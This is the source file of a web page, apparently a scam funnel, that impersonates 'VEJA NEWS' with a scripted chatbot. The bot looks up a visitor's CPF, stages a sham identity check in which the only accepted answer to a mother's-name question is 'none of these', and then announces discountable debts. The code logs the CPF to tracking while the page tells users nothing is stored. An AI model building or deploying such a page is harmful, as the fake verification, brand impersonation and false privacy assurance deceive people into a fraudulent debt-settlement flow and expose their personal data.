import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { track } from "@/lib/tracking";
import { defaultSiteContent, mergeSiteContent, type SiteContent } from "@/lib/site-content";

export const Route = createFileRoute("/chat2")({
  head: () => ({
    meta: [
      { title: "Verificação VEJA NEWS — Confirmação de identidade" },
      {
        name: "description",
        content:
          "Assistente virtual da VEJA NEWS: localizamos seu cadastro e confirmamos sua identidade antes de seguir com o atendimento.",
      },
      { property: "og:title", content: "Verificação VEJA NEWS" },
      {
        property: "og:description",
        content: "Confirme sua identidade para continuar a verificação de pendências no seu CPF.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: Chat2,
});

type Msg = { id: number; from: "bot" | "user"; text: string };

const NOMES_FAKE = [
  "Antônia Pereira Lima",
  "Cecília Rodrigues Martins",
  "Maria Aparecida dos Santos",
  "Joana Ferreira Alves",
  "Rosa Maria de Oliveira",
  "Terezinha Souza Barbosa",
  "Francisca Gomes da Silva",
  "Luzia Nascimento Costa",
];

function formatCPF(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 11);
  if (d.length !== 11) return d;
  return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
}

function shuffle<T>(arr: T[]) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j]!, a[i]!];
  }
  return a;
}

function Chat2() {
  const navigate = useNavigate();
  const [content, setContent] = useState<SiteContent>(defaultSiteContent);
  const [msgs, setMsgs] = useState<Msg[]>([]);
  const [typing, setTyping] = useState(true);
  const [status, setStatus] = useState("Aguarde, estamos verificando...");
  const [opcoes, setOpcoes] = useState<string[]>([]);
  const [mostrarContinuar, setMostrarContinuar] = useState(false);
  const [erro, setErro] = useState("");
  const scrollRef = useRef<HTMLDivElement | null>(null);
  const idRef = useRef(0);
  const startedRef = useRef(false);

  const cpfRaw = typeof window !== "undefined"
    ? (new URLSearchParams(window.location.search).get("cpf") || "").replace(/\D/g, "")
    : "";

  useEffect(() => {
    let alive = true;
    fetch("/api/public/site-content")
      .then((r) => r.json())
      .then((j) => {
        if (alive && j?.ok) setContent(mergeSiteContent(j.content));
      })
      .catch(() => {});
    return () => {
      alive = false;
    };
  }, []);

  useEffect(() => {
    scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight, behavior: "smooth" });
  }, [msgs, typing, opcoes, mostrarContinuar]);

  useEffect(() => {
    if (startedRef.current) return;
    startedRef.current = true;

    track("chat2", "chat2_view", cpfRaw ? { cpf: cpfRaw } : undefined);

    const timers: ReturnType<typeof setTimeout>[] = [];
    const push = (from: Msg["from"], text: string) => {
      idRef.current += 1;
      setMsgs((m) => [...m, { id: idRef.current, from, text }]);
    };
    const wait = (ms: number) => new Promise<void>((res) => timers.push(setTimeout(res, ms)));

    (async () => {
      if (!cpfRaw || cpfRaw.length !== 11) {
        setTyping(false);
        setStatus("");
        setErro("CPF não informado. Volte à página inicial e informe o seu CPF.");
        return;
      }

      await wait(1400);
      setTyping(false);
      push(
        "bot",
        "Olá! Sou o assistente virtual da VEJA NEWS. Vamos iniciar a verificação das pendências no seu nome para saber se você pode limpar o seu CPF com desconto.",
      );

      setTyping(true);
      await wait(1600);
      setTyping(false);
      push("bot", `Estou consultando o CPF ${formatCPF(cpfRaw)} nas bases parceiras. Um instante...`);
      setTyping(true);

      let nome = "";
      try {
        const r = await fetch(`/api/public/cpf/lookup?cpf=${cpfRaw}`);
        const j = await r.json();
        if (j?.status === 200) {
          nome = j.nome || "";
        }
      } catch {
        /* ignora */
      }

      await wait(1200);

      if (!nome) {
        setTyping(false);
        setStatus("");
        setErro("Não foi possível localizar o seu cadastro agora. Tente novamente em alguns minutos.");
        return;
      }

      setTyping(false);
      push("bot", `Encontrei o cadastro de ${nome}.`);

      setTyping(true);
      await wait(1500);
      setTyping(false);
      push("bot", "Para proteger os seus dados, confirme sua identidade: qual é o nome completo da sua mãe?");

      const distratores = shuffle(NOMES_FAKE).slice(0, 3);
      setOpcoes(["NENHUMA DESTAS", ...distratores]);
    })();

    return () => timers.forEach(clearTimeout);
  }, [cpfRaw]);

  const escolher = async (nome: string) => {
    idRef.current += 1;
    setMsgs((m) => [...m, { id: idRef.current, from: "user", text: nome }]);

    if (nome !== "NENHUMA DESTAS") {
      setTyping(true);
      await new Promise((r) => setTimeout(r, 900));
      setTyping(false);
      idRef.current += 1;
      setMsgs((m) => [
        ...m,
        {
          id: idRef.current,
          from: "bot",
          text: 'Essa opção não corresponde aos nossos registros. Se nenhum dos nomes é o da sua mãe, selecione "NENHUMA DESTAS".',
        },
      ]);
      setStatus('Selecione "NENHUMA DESTAS" para continuar.');
      return;
    }

    setOpcoes([]);
    setStatus("Aguarde, estamos verificando...");
    setTyping(true);
    await wait(1100);
    setTyping(false);
    idRef.current += 1;
    setMsgs((m) => [...m, { id: idRef.current, from: "bot", text: "Identidade confirmada!" }]);
    setTyping(true);
    await wait(1500);
    setTyping(false);
    idRef.current += 1;
    setMsgs((m) => [
      ...m,
      {
        id: idRef.current,
        from: "bot",
        text:
          "Localizamos pendências no seu CPF que podem ser regularizadas com desconto. Clique no botão abaixo para continuar o atendimento e ver as condições de negociação disponíveis para o seu nome.",
      },
    ]);
    setMostrarContinuar(true);
    setStatus("Identidade confirmada — use o botão Continuar acima.");
    track("chat2", "chat2_identidade_confirmada", cpfRaw ? { cpf: cpfRaw } : undefined);
  };

  const continuar = () => {
    track("chat2", "chat2_continuar", cpfRaw ? { cpf: cpfRaw } : undefined);
    navigate({ to: "/chat", search: { cpf: cpfRaw } as never });
  };

  return (
    <div className="min-h-screen bg-rodape font-['Open_Sans',sans-serif] text-texto-escuro">
      <div className="mx-auto w-full max-w-[520px]">
        {/* Faixa de aviso (editável no painel) */}
        <div className="bg-aviso-bg px-4 py-3 text-center text-[11.5px] leading-[1.5] text-texto-escuro">
          {content.banner_text}
        </div>

        <div className="bg-white/5 px-3 py-4">
          <div className="overflow-hidden rounded-2xl bg-white shadow-[0_10px_30px_rgba(6,24,18,0.25)]">
            {/* Cabeçalho do atendimento */}
            <div className="flex items-center gap-3 border-b border-black/5 px-4 py-3.5">
              <span className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-verde-primario text-white">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
                  <circle cx="11" cy="11" r="7" />
                  <line x1="16.5" y1="16.5" x2="21" y2="21" />
                </svg>
              </span>
              <div className="min-w-0">
                <strong className="block text-[15px] font-bold leading-tight">Verificação VEJA NEWS</strong>
                <span className="mt-0.5 flex items-center gap-1.5 text-[12px] text-texto-azulado">
                  <span className="inline-block h-2 w-2 rounded-full bg-verde-primario" />
                  assistente virtual · online
                </span>
              </div>
            </div>

            {/* Mensagens */}
            <div ref={scrollRef} className="flex h-[430px] flex-col gap-2.5 overflow-y-auto px-4 py-4">
              {msgs.map((m) =>
                m.from === "bot" ? (
                  <div
                    key={m.id}
                    className="max-w-[86%] self-start rounded-2xl bg-verde-suave px-4 py-3 text-[13.5px] leading-[1.55] text-texto-escuro"
                  >
                    {m.text}
                  </div>
                ) : (
                  <div
                    key={m.id}
                    className="max-w-[86%] self-end rounded-2xl bg-verde-primario px-4 py-3 text-[13.5px] font-semibold leading-[1.55] text-white"
                  >
                    {m.text}
                  </div>
                ),
              )}

              {typing && (
                <div className="flex w-[62px] items-center justify-center gap-1 self-start rounded-2xl bg-verde-suave px-4 py-3.5">
                  <span className="h-2 w-2 animate-bounce rounded-full bg-texto-azulado/70 [animation-delay:0ms]" />
                  <span className="h-2 w-2 animate-bounce rounded-full bg-texto-azulado/70 [animation-delay:150ms]" />
                  <span className="h-2 w-2 animate-bounce rounded-full bg-texto-azulado/70 [animation-delay:300ms]" />
                </div>
              )}

              {erro && (
                <div className="max-w-[92%] self-start rounded-2xl bg-alerta-amarelo-bg px-4 py-3 text-[13px] leading-[1.55] text-texto-escuro">
                  {erro}
                </div>
              )}

              {opcoes.length > 0 && (
                <div className="mt-1 flex flex-col gap-2.5">
                  {opcoes.map((n) => {
                    const isCorreta = n === "NENHUMA DESTAS";
                    return (
                      <button
                        key={n}
                        type="button"
                        onClick={() => escolher(n)}
                        className={
                          isCorreta
                            ? "w-full rounded-2xl border border-verde-primario/70 bg-verde-suave/60 px-4 py-3.5 text-left text-[13.5px] font-semibold text-verde-escuro transition-colors hover:bg-verde-suave"
                            : "w-full rounded-2xl bg-white px-4 py-3.5 text-left text-[13.5px] font-semibold text-texto-escuro shadow-[0_1px_6px_rgba(16,36,29,0.14)] transition-colors hover:bg-verde-suave"
                        }
                      >
                        {n}
                      </button>
                    );
                  })}
                </div>
              )}

              {mostrarContinuar && (
                <button type="button" onClick={continuar} className="btn-verde mt-1">
                  Continuar
                </button>
              )}
            </div>

            {/* Nota de rodapé do card */}
            <div className="border-t border-black/5 px-5 py-3">
              <p className="text-center text-[11.5px] leading-[1.55] text-texto-azulado">
                Seu CPF é usado apenas para localizar o seu cadastro e a confirmação de identidade protege os seus
                dados. Nada é armazenado nesta página.
              </p>
            </div>
            {status && (
              <p className="px-5 pb-4 text-center text-[12px] text-texto-azulado">{status}</p>
            )}
          </div>
        </div>

        {/* Rodapé */}
        <footer className="bg-rodape px-5 py-9 text-white">
          <strong className="block text-[15px] font-bold leading-snug">{content.footer_title}</strong>
          <p className="mt-3 text-[13px] leading-[1.6] text-white/85">
            Atendimento: <strong className="font-bold text-white">{content.footer_atendimento_email}</strong> ·{" "}
            {content.footer_atendimento_prazo}
          </p>
          <p className="mt-4 text-[12.5px] leading-[1.6] text-white/75">
            {content.footer_empresa}
            <br />
            {content.footer_endereco} · Telefone: {content.footer_telefone}
          </p>
          <p className="mt-4 text-[11.5px] leading-[1.65] text-white/60">{content.footer_disclaimer}</p>
        </footer>
      </div>
    </div>
  );
}
